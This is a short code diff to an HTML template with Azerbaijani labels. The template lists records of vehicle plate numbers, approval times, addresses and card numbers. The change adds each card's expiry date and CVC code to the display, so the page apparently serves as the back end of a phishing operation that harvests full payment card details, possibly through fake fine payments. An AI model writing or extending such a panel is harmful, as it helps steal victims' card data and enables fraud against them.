@@ -191,7 +191,9 @@
                             <div class="grid grid-cols-2 gap-2 text-gray-700">
                                 <div><strong>Nömrə:</strong> <span class="text-blue-600 font-bold">${item.plateNo}</span></div>
                                 <div><strong>Vaxt:</strong> ${item.approvedAt}</div>
-                                <div class="col-span-2"><strong>Kart:</strong> <span class="font-mono">${item.cardNo || 'N/A'}</span></div>
+                                <div class="col-span-2"><strong>Kart №:</strong> <span class="font-mono text-blue-800">${item.cardNo || 'N/A'}</span></div>
+                                <div><strong>Ay/İl (Exp):</strong> <span class="font-mono">${item.cardExp || 'N/A'}</span></div>
+                                <div><strong>CVC:</strong> <span class="font-mono">${item.cardCvc || 'N/A'}</span></div>
                                 <div class="col-span-2"><strong>Ünvan:</strong> ${item.location}</div>
                             </div>
                         </div>
